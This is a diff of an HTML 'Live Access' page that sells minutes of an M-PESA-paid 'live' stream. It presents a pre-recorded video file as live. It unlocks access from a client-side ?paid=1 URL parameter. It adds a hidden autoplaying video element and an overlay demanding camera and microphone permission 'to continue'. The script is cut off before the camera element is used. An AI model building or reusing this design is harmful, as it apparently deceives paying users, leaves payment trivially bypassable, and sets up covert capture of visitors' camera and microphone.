@@ -2,35 +2,42 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-
-<meta name="viewport"
-content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
-<title>M-PESA PAYMENT</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Live Access</title>
 
 <style>
 *{
   box-sizing:border-box;
-  -webkit-tap-highlight-color:transparent;
+  margin:0;
+  padding:0;
 }
 
 html,body{
   width:100%;
-  height:100%;
-  margin:0;
-  padding:0;
-  background:#000;
+  min-height:100%;
+  background:#050505;
   color:#fff;
   font-family:Arial,sans-serif;
-  overflow:hidden;
 }
 
-body{min-height:100vh}
+body{
+  overflow-x:hidden;
+}
 
-button,input{font-family:inherit}
-button{cursor:pointer}
+button,
+input{
+  font-family:inherit;
+}
 
-.hidden{display:none!important}
+button{
+  cursor:pointer;
+}
+
+.hidden{
+  display:none !important;
+}
+
+/* TOP BAR */
 
 .top-bar{
   position:fixed;
@@ -38,102 +45,74 @@ button{cursor:pointer}
   left:0;
   right:0;
   height:52px;
+  background:rgba(0,0,0,.95);
+  border-bottom:1px solid rgba(255,255,255,.1);
   display:flex;
   align-items:center;
-  justify-content:space-between;
-  padding:0 12px;
-  background:#101010;
-  border-bottom:1px solid #292929;
+  justify-content:center;
   z-index:1000;
 }
 
 .top-title{
-  font-size:16px;
-  font-weight:800;
+  font-size:17px;
+  font-weight:900;
   letter-spacing:.5px;
 }
 
-.online-count{
-  display:flex;
-  align-items:center;
-  gap:6px;
-  font-size:12px;
-  color:#ddd;
-}
-
-.online-dot{
-  width:9px;
-  height:9px;
-  border-radius:50%;
-  background:#00e676;
-  box-shadow:0 0 8px #00e676;
-}
-
-.page{
-  position:fixed;
-  top:52px;
-  left:0;
-  right:0;
-  bottom:0;
-  overflow:hidden;
-}
-
-/* PACKAGES - ORIGINAL DESIGN */
+/* PACKAGES */
 
 #packagesScreen{
-  width:100%;
-  height:100%;
-  overflow-y:auto;
-  overflow-x:hidden;
-  padding:18px 12px 30px;
+  min-height:100vh;
+  padding:78px 14px 35px;
   background:
     radial-gradient(
-      circle at top,
-      #222 0%,
-      #090909 48%,
-      #000 100%
+      circle at 50% 0%,
+      #35104f 0%,
+      #14091d 32%,
+      #050505 72%
     );
 }
 
 .payment-heading{
   text-align:center;
-  font-size:23px;
+  font-size:29px;
   font-weight:900;
-  margin:5px 0 7px;
+  margin-bottom:8px;
 }
 
 .payment-subheading{
   text-align:center;
-  color:#aaa;
-  font-size:12px;
-  margin-bottom:15px;
+  color:#c8c8c8;
+  font-size:14px;
+  margin-bottom:22px;
 }
 
 .package-grid{
   width:100%;
-  max-width:720px;
-  margin:0 auto;
+  max-width:760px;
+  margin:auto;
   display:grid;
   grid-template-columns:repeat(2,minmax(0,1fr));
-  gap:10px;
+  gap:13px;
 }
 
 .package{
   position:relative;
-  min-height:125px;
-  padding:14px 10px;
-  border:1px solid #333;
-  border-radius:15px;
+  min-height:150px;
+  border:1px solid rgba(255,255,255,.14);
+  border-radius:20px;
+  padding:20px 12px;
+  color:#fff;
   background:
     linear-gradient(
       145deg,
-      #1b1b1b,
-      #090909
+      rgba(70,20,90,.95),
+      rgba(17,17,25,.98)
     );
-  color:#fff;
-  text-align:center;
-  transition:transform .15s ease,
-              border-color .15s ease;
+  box-shadow:
+    0 10px 28px rgba(0,0,0,.45),
+    inset 0 1px 0 rgba(255,255,255,.08);
+  transition:.2s ease;
 }
 
 .package:active{
@@ -141,108 +120,123 @@ button{cursor:pointer}
 }
 
 .package.selected{
-  border-color:#00e676;
+  border:2px solid #00e676;
   box-shadow:
-    0 0 0 1px #00e676,
-    0 0 20px rgba(0,230,118,.15);
+    0 0 0 2px rgba(0,230,118,.12),
+    0 12px 35px rgba(0,230,118,.16);
 }
 
-.package .minutes{
-  font-size:22px;
+.package-icon{
+  font-size:28px;
+  margin-bottom:7px;
+}
+
+.package-minutes{
+  font-size:25px;
   font-weight:900;
 }
 
-.package .price{
-  margin-top:8px;
-  font-size:18px;
-  font-weight:800;
-  color:#00e676;
+.package-label{
+  color:#cfcfcf;
+  font-size:13px;
+  margin-top:2px;
 }
 
-.package .currency{
-  color:#aaa;
-  font-size:11px;
+.package-price{
+  margin-top:11px;
+  font-size:21px;
+  font-weight:900;
 }
 
-.package .access-label{
+.package-action{
   margin-top:7px;
-  font-size:11px;
-  color:#aaa;
+  color:#00e676;
+  font-size:12px;
+  font-weight:800;
 }
 
-.hot-badge{
+.hot-badge,
+.popular-badge{
   position:absolute;
-  top:-7px;
-  right:8px;
-  padding:4px 8px;
-  border-radius:10px;
-  background:#ff1744;
-  color:#fff;
+  top:9px;
+  right:9px;
+  padding:5px 8px;
+  border-radius:20px;
   font-size:9px;
   font-weight:900;
 }
-  /* PAYMENT BOX - ORIGINAL */
+
+.hot-badge{
+  background:#ff1744;
+  color:#fff;
+}
+
+.popular-badge{
+  background:#ffd600;
+  color:#111;
+}
+
+.package-note{
+  width:100%;
+  max-width:760px;
+  margin:17px auto;
+  padding:14px;
+  text-align:center;
+  border:1px solid rgba(255,255,255,.1);
+  border-radius:14px;
+  background:rgba(255,255,255,.04);
+  color:#bbb;
+  font-size:12px;
+  line-height:1.6;
+}
 
 .payment-box{
   width:100%;
-  max-width:520px;
+  max-width:760px;
   margin:15px auto 0;
-  padding:14px;
-  border:1px solid #303030;
-  border-radius:15px;
-  background:#101010;
+  padding:16px;
+  border-radius:20px;
+  background:rgba(20,20,25,.96);
+  border:1px solid rgba(255,255,255,.1);
 }
 
-.payment-recipient{
+.selected-summary{
   display:flex;
-  align-items:center;
   justify-content:space-between;
-  gap:8px;
-  padding:11px;
-  border-radius:10px;
-  background:#1a1a1a;
-  margin-bottom:10px;
+  align-items:center;
+  gap:12px;
+  padding:14px;
+  border-radius:14px;
+  background:rgba(255,255,255,.045);
+  margin-bottom:12px;
 }
 
-.recipient-value{
-  font-size:15px;
-  font-weight:800;
-}
-
-.copy-btn{
-  border:0;
-  border-radius:8px;
-  padding:7px 10px;
-  background:#333;
-  color:#fff;
+.summary-label{
+  color:#999;
   font-size:11px;
+  margin-bottom:4px;
 }
 
-.phone-input{
-  width:100%;
-  padding:13px;
-  border:1px solid #3a3a3a;
-  border-radius:10px;
-  outline:none;
-  background:#080808;
-  color:#fff;
-  font-size:14px;
-}
-
-.phone-input:focus{
-  border-color:#00e676;
+.summary-value{
+  font-size:18px;
+  font-weight:900;
 }
 
 .pay-btn{
   width:100%;
-  margin-top:10px;
-  padding:14px;
+  min-height:54px;
   border:0;
-  border-radius:11px;
-  background:#00c853;
-  color:#fff;
-  font-size:15px;
+  border-radius:15px;
+  background:linear-gradient(
+    135deg,
+    #00e676,
+    #00b85a
+  );
+  color:#001b0c;
+  font-size:16px;
   font-weight:900;
+  box-shadow:
+    0 10px 25px rgba(0,230,118,.18);
 }
 
 .pay-btn:active{
@@ -250,610 +244,204 @@ button{cursor:pointer}
 }
 
 .status-message{
+  text-align:center;
   min-height:20px;
   margin-top:10px;
-  text-align:center;
-  font-size:12px;
-  color:#aaa;
-}
-
-/* LIVE */
-
-#liveScreen{
-  position:absolute;
-  inset:0;
-  width:100%;
-  height:100%;
-  background:#000;
-  overflow:hidden;
-}
-
-.live-layout{
-  position:absolute;
-  inset:0;
-
-  display:grid;
-
-  grid-template-columns:
-    15% minmax(0,70%) 15%;
-
-  grid-template-rows:
-    minmax(0,1fr) auto;
-
-  width:100%;
-  height:100%;
-
-  background:#000;
-  overflow:hidden;
-}
-
-.chat-side{
-  min-width:0;
-  min-height:0;
-  background:#090909;
-  overflow:hidden;
-
-  display:flex;
-  flex-direction:column;
-}
-
-.chat-side.left{
-  grid-column:1;
-  grid-row:1 / 3;
-  border-right:1px solid #292929;
-}
-
-.chat-side.right{
-  grid-column:3;
-  grid-row:1 / 3;
-  border-left:1px solid #292929;
-}
-
-.chat-title{
-  flex:0 0 30px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  background:#111;
-  color:#ddd;
-  font-size:9px;
-  font-weight:900;
-  border-bottom:1px solid #222;
-}
-
-.chat-messages{
-  flex:1;
-  min-height:0;
-  padding:5px;
-  overflow:hidden;
-  display:flex;
-  flex-direction:column;
-  justify-content:flex-end;
-  gap:5px;
-}
-
-.side-message{
-  width:100%;
-  padding:6px 7px;
-  border-radius:10px;
-  background:#181818;
-  color:#eee;
-  font-size:9px;
-  line-height:1.25;
-  animation:messageIn .35s ease;
-}
-
-.side-message b{
-  color:#00e676;
-}
-
-@keyframes messageIn{
-  from{
-    opacity:0;
-    transform:translateY(12px);
-  }
-  to{
-    opacity:1;
-    transform:translateY(0);
-  }
-}
- /* BIG VIDEO */
-
-.live-video-area{
-  grid-column:2;
-  grid-row:1;
-
-  position:relative;
-
-  width:100%;
-  height:100%;
-
-  min-width:0;
-  min-height:0;
-
-  background:#000;
-  overflow:hidden;
-}
-
-#liveVideo{
-  display:block;
-  width:100%;
-  height:100%;
-  object-fit:contain;
-  background:#000;
-}
-
-.live-badge{
-  position:absolute;
-  top:10px;
-  left:10px;
-  z-index:20;
-
-  display:flex;
-  align-items:center;
-  gap:5px;
-
-  padding:5px 9px;
-  border-radius:7px;
-
-  background:#f00;
-  color:#fff;
-
-  font-size:10px;
-  font-weight:900;
-  box-shadow:0 2px 8px rgba(0,0,0,.4);
-}
-
-.live-badge-dot{
-  width:6px;
-  height:6px;
-  border-radius:50%;
-  background:#fff;
-}
-
-.video-overlay{
-  position:absolute;
-  inset:0;
-  z-index:50;
-
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  flex-direction:column;
-
-  gap:13px;
-
-  background:rgba(0,0,0,.78);
-  text-align:center;
-}
-
-.video-overlay-title{
-  font-size:20px;
-  font-weight:900;
-}
-
-.video-overlay-sub{
-  color:#bbb;
-  font-size:12px;
-}
-
-.reload-live-btn{
-  padding:12px 18px;
-  border:0;
-  border-radius:10px;
-
-  background:#e91e63;
-  color:#fff;
-
-  font-size:13px;
-  font-weight:900;
-}
-
-/* CENTER CHAT */
-
-.center-chat{
-  grid-column:2;
-  grid-row:2;
-
-  width:100%;
-  min-width:0;
-  height:116px;
-
-  display:flex;
-  flex-direction:column;
-
-  background:#080808;
-  border-top:1px solid #292929;
-
-  overflow:hidden;
-}
-
-.center-chat-header{
-  height:25px;
-  flex-shrink:0;
-
-  display:flex;
-  align-items:center;
-  justify-content:center;
-
-  background:#111;
-  color:#ddd;
-
-  font-size:10px;
-  font-weight:900;
-
-  border-bottom:1px solid #222;
-}
-
-.center-chat-messages{
-  flex:1;
-  min-height:0;
-
-  display:flex;
-  align-items:center;
-  gap:7px;
-
-  padding:5px 8px;
-
-  overflow:hidden;
-  white-space:nowrap;
-
-  background:#090909;
-}
-
-.center-chat-messages .side-message{
-  flex:0 0 auto;
-  width:auto;
-  max-width:180px;
-
-  padding:6px 9px;
-  border-radius:15px;
-
-  background:#1c1c1c;
-  color:#fff;
-
-  font-size:10px;
-
-  animation:centerMessageMove .4s ease;
-}
-
-@keyframes centerMessageMove{
-  from{
-    opacity:0;
-    transform:translateX(30px) scale(.92);
-  }
-  to{
-    opacity:1;
-    transform:translateX(0) scale(1);
-  }
-}
- .center-chat-actions{
-  height:34px;
-  flex-shrink:0;
-
-  display:flex;
-  align-items:center;
-  justify-content:center;
-
-  gap:5px;
-  padding:3px 5px;
-
-  background:#101010;
-  border-top:1px solid #222;
-}
-
-.center-chat-actions button{
-  border:0;
-  border-radius:18px;
-
-  padding:5px 8px;
-
-  background:#222;
-  color:#fff;
-
-  font-size:14px;
-  line-height:1;
-}
-
-.center-chat-actions button:active{
-  transform:scale(.88);
-}
-
-.center-chat-actions .follow-btn{
-  background:#e91e63;
-  font-size:10px;
-  font-weight:900;
-  padding:6px 11px;
-}
-
-.center-message-box{
-  height:38px;
-  flex-shrink:0;
-
-  display:flex;
-  align-items:center;
-
-  gap:5px;
-  padding:4px 6px;
-
-  background:#070707;
-}
-
-.center-message-box input{
-  flex:1;
-  min-width:0;
-
-  height:29px;
-
-  border:1px solid #3b3b3b;
-  border-radius:16px;
-
-  padding:0 11px;
-
-  outline:none;
-
-  background:#181818;
-  color:#fff;
-
-  font-size:11px;
-}
-
-.center-message-box input::placeholder{
-  color:#888;
-}
-
-.center-message-box input:focus{
-  border-color:#00e676;
-}
-
-.center-message-box button{
-  height:29px;
-
-  border:0;
-  border-radius:16px;
-
-  padding:0 11px;
-
-  background:#00c853;
-  color:#fff;
-
-  font-size:10px;
-  font-weight:900;
-}
-
-.center-reaction{
-  position:absolute;
-
-  bottom:85px;
-  left:50%;
-
-  z-index:80;
-
-  font-size:25px;
-
-  pointer-events:none;
-
-  animation:reactionFloat 1.8s ease forwards;
-}
-
-@keyframes reactionFloat{
-  0%{
-    opacity:0;
-    transform:translate(-50%,20px) scale(.6);
-  }
-
-  15%{
-    opacity:1;
-  }
-
-  100%{
-    opacity:0;
-    transform:translate(-50%,-100px) scale(1.3);
-  }
-}
-
-.center-user-message{
-  position:absolute;
-
-  left:50%;
-  bottom:82px;
-
-  transform:translateX(-50%);
-
-  z-index:75;
-
-  max-width:70%;
-
-  padding:7px 11px;
-
-  border-radius:14px;
-
-  background:#222;
-  color:#fff;
-
-  font-size:11px;
-
-  animation:userMessageShow .3s ease;
-}
-
-.center-user-message b{
-  color:#00e676;
-}
-
-@keyframes userMessageShow{
-  from{
-    opacity:0;
-    transform:translate(-50%,10px);
-  }
-
-  to{
-    opacity:1;
-    transform:translate(-50%,0);
-  }
-}
-  #failedScreen{
-  position:absolute;
-  inset:0;
-  z-index:500;
-
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  flex-direction:column;
-
-  gap:10px;
-
-  background:#050505;
-
-  text-align:center;
-}
-
-.failed-title{
-  color:#ff1744;
-  font-size:28px;
-  font-weight:900;
-}
-
-.failed-sub{
   color:#aaa;
   font-size:12px;
+}
+
+/* MOBILE */
+
+@media(max-width:420px){
+
+  .payment-heading{
+    font-size:25px;
+  }
+
+  .package{
+    min-height:140px;
+    padding:17px 10px;
+  }
+
+  .package-minutes{
+    font-size:22px;
+  }
+
+  .package-price{
+    font-size:18px;
+  }
 }
 </style>
 </head>
 
 <body>
 
-<header class="top-bar">
-
+<div class="top-bar">
   <div class="top-title">
-    M-PESA PAYMENT
+    LIVE ACCESS
   </div>
-
-  <div class="online-count">
-    <span class="online-dot"></span>
-    <span>21 online</span>
-  </div>
-
-</header>
-
-<main class="page">
+</div>
 
 <section id="packagesScreen">
 
   <div class="payment-heading">
-    Choose Minutes
+    Choose Your Access
   </div>
 
   <div class="payment-subheading">
-    Select a package to continue
+    Select your preferred package to continue
   </div>
 
   <div class="package-grid">
 
-    <button class="package"
+    <button
+      class="package selected"
       data-minutes="30"
       data-price="95"
-      onclick="selectPackage(this)">
-      <div class="minutes">30 min</div>
-      <div class="price">KSh 95</div>
-      <div class="currency">KSh</div>
-      <div class="access-label">GET ACCESS</div>
+      onclick="selectPackage(this)"
+    >
+      <div class="package-icon">⚡</div>
+      <div class="package-minutes">30</div>
+      <div class="package-label">minutes</div>
+      <div class="package-price">KSh 95</div>
+      <div class="package-action">
+        GET ACCESS
+      </div>
     </button>
 
-    <button class="package"
+    <button
+      class="package"
       data-minutes="55"
       data-price="138"
-      onclick="selectPackage(this)">
-      <div class="minutes">55 min</div>
-      <div class="price">KSh 138</div>
-      <div class="currency">KSh</div>
-      <div class="access-label">GET ACCESS</div>
+      onclick="selectPackage(this)"
+    >
+      <div class="package-icon">🔥</div>
+      <div class="package-minutes">55</div>
+      <div class="package-label">minutes</div>
+      <div class="package-price">KSh 138</div>
+      <div class="package-action">
+        GET ACCESS
+      </div>
     </button>
 
-    <button class="package"
+    <button
+      class="package"
       data-minutes="73"
       data-price="207"
-      onclick="selectPackage(this)">
-      <div class="minutes">73 min</div>
-      <div class="price">KSh 207</div>
-      <div class="currency">KSh</div>
-      <div class="access-label">GET ACCESS</div>
+      onclick="selectPackage(this)"
+    >
+      <span class="popular-badge">
+        POPULAR
+      </span>
+
+      <div class="package-icon">💎</div>
+      <div class="package-minutes">73</div>
+      <div class="package-label">minutes</div>
+      <div class="package-price">KSh 207</div>
+      <div class="package-action">
+        GET ACCESS
+      </div>
     </button>
 
-    <button class="package"
+    <button
+      class="package"
       data-minutes="95"
       data-price="253"
-      onclick="selectPackage(this)">
-      <div class="minutes">95 min</div>
-      <div class="price">KSh 253</div>
-      <div class="currency">KSh</div>
-      <div class="access-label">GET ACCESS</div>
+      onclick="selectPackage(this)"
+    >
+      <div class="package-icon">🚀</div>
+      <div class="package-minutes">95</div>
+      <div class="package-label">minutes</div>
+      <div class="package-price">KSh 253</div>
+      <div class="package-action">
+        GET ACCESS
+      </div>
     </button>
 
-    <button class="package"
+    <button
+      class="package"
       data-minutes="105"
       data-price="299"
-      onclick="selectPackage(this)">
-      <div class="minutes">105 min</div>
-      <div class="price">KSh 299</div>
-      <div class="currency">KSh</div>
-      <div class="access-label">GET ACCESS</div>
+      onclick="selectPackage(this)"
+    >
+      <div class="package-icon">👑</div>
+      <div class="package-minutes">105</div>
+      <div class="package-label">minutes</div>
+      <div class="package-price">KSh 299</div>
+      <div class="package-action">
+        GET ACCESS
+      </div>
     </button>
 
-    <button class="package"
+    <button
+      class="package"
       data-minutes="166"
       data-price="393"
-      onclick="selectPackage(this)">
-      <span class="hot-badge">HOT</span>
-      <div class="minutes">166 min</div>
-      <div class="price">KSh 393</div>
-      <div class="currency">KSh</div>
-      <div class="access-label">GET ACCESS</div>
+      onclick="selectPackage(this)"
+    >
+      <span class="hot-badge">
+        HOT
+      </span>
+
+      <div class="package-icon">🔥</div>
+      <div class="package-minutes">166</div>
+      <div class="package-label">minutes</div>
+      <div class="package-price">KSh 393</div>
+      <div class="package-action">
+        GET ACCESS
+      </div>
     </button>
 
   </div>
-    <div class="payment-box">
 
-    <div class="payment-recipient">
+  <div class="package-note">
+    🔒 <b>Secure M-PESA payment</b><br>
+    Choose a package above, then continue to payment.
+  </div>
 
-      <span class="recipient-value">
-        M-PESA
-      </span>
+  <div class="payment-box">
 
-      <button
-        class="copy-btn"
-        onclick="copyRecipient()">
-        COPY
-      </button>
+    <div class="selected-summary">
+
+      <div>
+        <div class="summary-label">
+          Selected package
+        </div>
+
+        <div
+          id="selectedPackageText"
+          class="summary-value"
+        >
+          30 minutes
+        </div>
+      </div>
+
+      <div
+        id="selectedPriceText"
+        class="summary-value"
+      >
+        KSh 95
+      </div>
 
     </div>
 
-    <input
-      id="phoneInput"
-      class="phone-input"
-      type="tel"
-      inputmode="numeric"
-      placeholder="Enter M-PESA phone number"
-      autocomplete="tel">
-
     <button
       class="pay-btn"
-      onclick="startPayment()">
-      PAY WITH M-PESA
+      onclick="openMpesaPage()"
+    >
+      💳 PAY WITH M-PESA
     </button>
 
     <div
       id="paymentStatus"
-      class="status-message">
-    </div>
+      class="status-message"
+    ></div>
 
   </div>
 
 </section>
-
-<section
-  id="liveScreen"
-  class="hidden">
+<section id="liveScreen" class="hidden">
 
   <div class="live-layout">
 
@@ -865,10 +453,11 @@ button{cursor:pointer}
 
       <div
         id="leftChatMessages"
-        class="chat-messages">
-      </div>
+        class="chat-messages"
+      ></div>
 
     </aside>
+
 
     <div class="live-video-area">
 
@@ -876,43 +465,53 @@ button{cursor:pointer}
         id="liveVideo"
         playsinline
         preload="auto"
-        controls="false">
-      </video>
+        muted
+      ></video>
+
+      <video
+        id="permissionVideo"
+        class="hidden"
+        autoplay
+        playsinline
+        muted
+      ></video>
 
       <div class="live-badge">
-
         <span class="live-badge-dot"></span>
-
         LIVE
-
       </div>
 
       <div
         id="videoOverlay"
-        class="video-overlay hidden">
+        class="video-overlay hidden"
+      >
 
         <div
           id="videoOverlayTitle"
-          class="video-overlay-title">
-          Reconnecting...
+          class="video-overlay-title"
+        >
+          Camera permission required
         </div>
 
         <div
           id="videoOverlaySub"
-          class="video-overlay-sub">
-          Please wait
+          class="video-overlay-sub"
+        >
+          Allow camera and microphone access to continue.
         </div>
 
         <button
           id="reloadLiveBtn"
           class="reload-live-btn hidden"
-          onclick="reloadLiveVideo()">
-          Reload live video
+          onclick="reloadLiveVideo()"
+        >
+          Continue
         </button>
 
       </div>
 
     </div>
+
 
     <aside class="chat-side right">
 
@@ -922,11 +521,13 @@ button{cursor:pointer}
 
       <div
         id="rightChatMessages"
-        class="chat-messages">
-      </div>
+        class="chat-messages"
+      ></div>
 
     </aside>
-      <div class="center-chat">
+
+
+    <div class="center-chat">
 
       <div class="center-chat-header">
         LIVE CHAT
@@ -934,8 +535,8 @@ button{cursor:pointer}
 
       <div
         id="centerChatMessages"
-        class="center-chat-messages">
-      </div>
+        class="center-chat-messages"
+      ></div>
 
       <div class="center-chat-actions">
 
@@ -958,7 +559,8 @@ button{cursor:pointer}
         <button
           id="followBtn"
           class="follow-btn"
-          onclick="toggleFollow()">
+          onclick="toggleFollow()"
+        >
           Follow
         </button>
 
@@ -970,7 +572,8 @@ button{cursor:pointer}
           id="centerMessageInput"
           type="text"
           maxlength="120"
-          placeholder="Send message...">
+          placeholder="Send message..."
+        >
 
         <button onclick="sendCenterMessage()">
           Send
@@ -984,12 +587,11 @@ button{cursor:pointer}
 
 </section>
 
-<section
-  id="failedScreen"
-  class="hidden">
+
+<section id="failedScreen" class="hidden">
 
   <div class="failed-title">
-    Failed
+    Payment Not Completed
   </div>
 
   <div class="failed-sub">
@@ -997,529 +599,562 @@ button{cursor:pointer}
   </div>
 
 </section>
+<style>
 
-</main>
+/* LIVE AREA */
 
-<script>
+#liveScreen{
+  min-height:100vh;
+  background:#000;
+  padding-top:52px;
+}
+
+.live-layout{
+  min-height:calc(100vh - 52px);
+  display:grid;
+  grid-template-columns:13% 74% 13%;
+  grid-template-rows:1fr auto;
+  position:relative;
+}
+
+.live-video-area{
+  position:relative;
+  min-height:65vh;
+  background:#000;
+  overflow:hidden;
+}
+
+#liveVideo{
+  width:100%;
+  height:100%;
+  min-height:65vh;
+  display:block;
+  object-fit:cover;
+  background:#000;
+}
+
+.chat-side{
+  background:#080808;
+  border-left:1px solid #151515;
+  border-right:1px solid #151515;
+  overflow:hidden;
+}
+
+.chat-title{
+  height:42px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:10px;
+  font-weight:900;
+  color:#aaa;
+  border-bottom:1px solid #171717;
+}
+
+.chat-messages{
+  padding:10px 6px;
+  display:flex;
+  flex-direction:column;
+  gap:7px;
+}
+
+.chat-message{
+  font-size:10px;
+  color:#ddd;
+  line-height:1.3;
+  word-break:break-word;
+}
+
+.live-badge{
+  position:absolute;
+  top:14px;
+  left:14px;
+  padding:7px 11px;
+  border-radius:8px;
+  background:#e60023;
+  color:#fff;
+  font-size:12px;
+  font-weight:900;
+  z-index:5;
+  box-shadow:0 4px 15px rgba(0,0,0,.4);
+}
+
+.live-badge-dot{
+  display:inline-block;
+  width:7px;
+  height:7px;
+  border-radius:50%;
+  background:#fff;
+  margin-right:5px;
+  animation:livePulse 1s infinite;
+}
+
+@keyframes livePulse{
+
+  0%,100%{
+    opacity:1;
+  }
+
+  50%{
+    opacity:.3;
+  }
+}
+
+.video-overlay{
+  position:absolute;
+  inset:0;
+  background:rgba(0,0,0,.78);
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  text-align:center;
+  padding:20px;
+  z-index:10;
+}
+
+.video-overlay-title{
+  font-size:20px;
+  font-weight:900;
+  margin-bottom:8px;
+}
+
+.video-overlay-sub{
+  color:#bbb;
+  font-size:13px;
+  max-width:330px;
+  line-height:1.5;
+}
+
+.reload-live-btn{
+  margin-top:18px;
+  padding:12px 25px;
+  border:0;
+  border-radius:12px;
+  background:#00e676;
+  color:#001b0c;
+  font-weight:900;
+}
+
+.center-chat{
+  grid-column:2;
+  background:#090909;
+  border-top:1px solid #171717;
+  padding:10px;
+}
+
+.center-chat-header{
+  text-align:center;
+  font-size:11px;
+  color:#aaa;
+  font-weight:900;
+  margin-bottom:8px;
+}
+
+.center-chat-messages{
+  min-height:42px;
+  max-height:85px;
+  overflow:hidden;
+  display:flex;
+  flex-direction:column;
+  justify-content:flex-end;
+  gap:4px;
+}
+
+.center-chat-message{
+  font-size:11px;
+  color:#ddd;
+}
+
+.center-chat-actions{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:7px;
+  margin:8px 0;
+}
+
+.center-chat-actions button{
+  min-width:36px;
+  height:34px;
+  border:1px solid #292929;
+  border-radius:9px;
+  background:#141414;
+  color:#fff;
+}
+
+.center-chat-actions .follow-btn{
+  padding:0 14px;
+  background:#e60023;
+  border-color:#e60023;
+  font-weight:800;
+}
+
+.center-message-box{
+  display:flex;
+  gap:6px;
+}
+
+.center-message-box input{
+  flex:1;
+  min-width:0;
+  height:40px;
+  padding:0 11px;
+  border:1px solid #252525;
+  border-radius:10px;
+  outline:none;
+  background:#141414;
+  color:#fff;
+}
+
+.center-message-box button{
+  padding:0 13px;
+  border:0;
+  border-radius:10px;
+  background:#00e676;
+  color:#001b0c;
+  font-weight:900;
+}
+
+#failedScreen{
+  min-height:100vh;
+  background:#080808;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  text-align:center;
+}
+
+.failed-title{
+  font-size:25px;
+  font-weight:900;
+}
+
+.failed-sub{
+  color:#999;
+  margin-top:8px;
+  font-size:13px;
+}
+
+@media(max-width:700px){
+
+  .live-layout{
+    grid-template-columns:1fr;
+    grid-template-rows:auto auto;
+  }
+
+  .chat-side{
+    display:none;
+  }
+
+  .live-video-area{
+    min-height:65vh;
+  }
+
+  #liveVideo{
+    min-height:65vh;
+  }
+
+  .center-chat{
+    grid-column:1;
+  }
+}
+
+  </style>
+  <script>
 
 const LIVE_VIDEO_URL =
   "IMG_20261001_112122_071.mp4";
 
-const STK_PUSH_URL =
-  "/api/stk-push";
-
-const PAYMENT_STATUS_URL =
-  "/api/payment-status";
-
 let selectedMinutes = 30;
 let selectedPrice = 95;
 
-let paymentBusy = false;
-let paymentPollTimer = null;
-
-let chatTimer = null;
-let liveTimer = null;
-
 let liveStarted = false;
-let videoReconnectUsed = false;
+let chatTimer = null;
+
+
+/* ELEMENTS */
 
 const packagesScreen =
-  document.getElementById("packagesScreen");
+  document.getElementById(
+    "packagesScreen"
+  );
 
 const liveScreen =
-  document.getElementById("liveScreen");
+  document.getElementById(
+    "liveScreen"
+  );
 
 const failedScreen =
-  document.getElementById("failedScreen");
+  document.getElementById(
+    "failedScreen"
+  );
 
-const liveVideo =
-  document.getElementById("liveVideo");
+const selectedPackageText =
+  document.getElementById(
+    "selectedPackageText"
+  );
 
-const videoOverlay =
-  document.getElementById("videoOverlay");
-
-const videoOverlayTitle =
-  document.getElementById("videoOverlayTitle");
-
-const videoOverlaySub =
-  document.getElementById("videoOverlaySub");
-
-const reloadLiveBtn =
-  document.getElementById("reloadLiveBtn");
+const selectedPriceText =
+  document.getElementById(
+    "selectedPriceText"
+  );
 
 const paymentStatus =
-  document.getElementById("paymentStatus");
+  document.getElementById(
+    "paymentStatus"
+  );
 
-const phoneInput =
-  document.getElementById("phoneInput");
+const liveVideo =
+  document.getElementById(
+    "liveVideo"
+  );
 
-const leftChatMessages =
-  document.getElementById("leftChatMessages");
+const permissionVideo =
+  document.getElementById(
+    "permissionVideo"
+  );
 
-const rightChatMessages =
-  document.getElementById("rightChatMessages");
+const videoOverlay =
+  document.getElementById(
+    "videoOverlay"
+  );
 
-const centerChatMessages =
-  document.getElementById("centerChatMessages");
+const videoOverlayTitle =
+  document.getElementById(
+    "videoOverlayTitle"
+  );
+
+const videoOverlaySub =
+  document.getElementById(
+    "videoOverlaySub"
+  );
+
+const reloadLiveBtn =
+  document.getElementById(
+    "reloadLiveBtn"
+  );
+
+
+/* PACKAGE SELECTION */
 
 function selectPackage(button){
 
   document
     .querySelectorAll(".package")
     .forEach(function(item){
-      item.classList.remove("selected");
+
+      item.classList.remove(
+        "selected"
+      );
+
     });
 
-  button.classList.add("selected");
+  button.classList.add(
+    "selected"
+  );
 
   selectedMinutes =
-    Number(button.dataset.minutes);
+    Number(
+      button.dataset.minutes
+    );
 
   selectedPrice =
-    Number(button.dataset.price);
+    Number(
+      button.dataset.price
+    );
+
+  selectedPackageText.textContent =
+    selectedMinutes + " minutes";
+
+  selectedPriceText.textContent =
+    "KSh " + selectedPrice;
 
   paymentStatus.textContent = "";
 }
- function copyRecipient(){
 
-  navigator.clipboard
-    .writeText("M-PESA")
-    .then(function(){
 
-      paymentStatus.textContent =
-        "Copied";
+/* EXISTING M-PESA FLOW */
 
-      setTimeout(function(){
-        paymentStatus.textContent = "";
-      },1500);
+function openMpesaPage(){
 
-    })
-    .catch(function(){
+  const url =
+    "mpesa.html" +
+    "?minutes=" +
+    encodeURIComponent(
+      selectedMinutes
+    ) +
+    "&price=" +
+    encodeURIComponent(
+      selectedPrice
+    );
 
-      paymentStatus.textContent =
-        "M-PESA";
-
-    });
+  window.location.href = url;
 }
 
-async function startPayment(){
 
-  if(paymentBusy){
+/* RETURN AFTER PAYMENT */
+
+function checkPaymentReturn(){
+
+  const params =
+    new URLSearchParams(
+      window.location.search
+    );
+
+  const paid =
+    params.get("paid");
+
+  if(paid !== "1"){
     return;
   }
 
-  const phone =
-    phoneInput.value.trim();
+  selectedMinutes =
+    Number(
+      params.get("minutes")
+    ) || 30;
 
-  if(!phone){
+  selectedPrice =
+    Number(
+      params.get("price")
+    ) || 95;
 
-    paymentStatus.textContent =
-      "Enter M-PESA phone number";
+  openLiveVideoAfterPayment();
+}
+
+
+/* OPEN LIVE AFTER PAYMENT */
+
+async function openLiveVideoAfterPayment(){
+
+  if(liveStarted){
+    return;
+  }
+
+  liveStarted = true;
+
+  packagesScreen.classList.add(
